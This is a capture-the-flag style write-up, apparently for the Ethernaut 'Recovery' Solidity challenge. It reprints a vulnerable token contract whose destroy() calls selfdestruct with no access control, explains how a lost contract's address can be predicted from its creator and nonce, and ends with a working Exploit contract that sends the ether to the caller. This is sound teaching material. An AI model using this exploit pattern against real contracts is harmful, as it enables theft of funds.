<div align="center">

# Recovery

</div>



**Recovery (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}


```

</details>

---------

**Approach and Exploit Method Including Code :** 

1. **Understand the contract**

   - `Recovery` is a factory contract that deploys new `SimpleToken` contracts for anyone who calls `generateToken(...)`.  
   - `SimpleToken` stores balances and can receive ether via `receive()`. It also has a `destroy()` function that calls `selfdestruct(_to)` to send all its ether to the specified address.  
   - **Key idea:** Even if the deployed token contract address is “lost,” it can be **predicted** because Ethereum contract addresses are deterministic — based on the creator address and their nonce.


2. **Vulnerability Highlight (key part)**


```solidity
// destroy function allows anyone who knows the address to selfdestruct the contract
function destroy(address payable _to) public {
    selfdestruct(_to);
}
```


## Exploit Code

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract Exploit {
    function recoverFunds(address recoveryAddr) public {
        address payable lostAddr = payable(
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6),
                                bytes1(0x94),
                                recoveryAddr,
                                bytes1(0x01)
                            )
                        )
                    )
                )
            )
        );

        ISimpleToken(lostAddr).destroy(payable(msg.sender));
    }
}


```

---


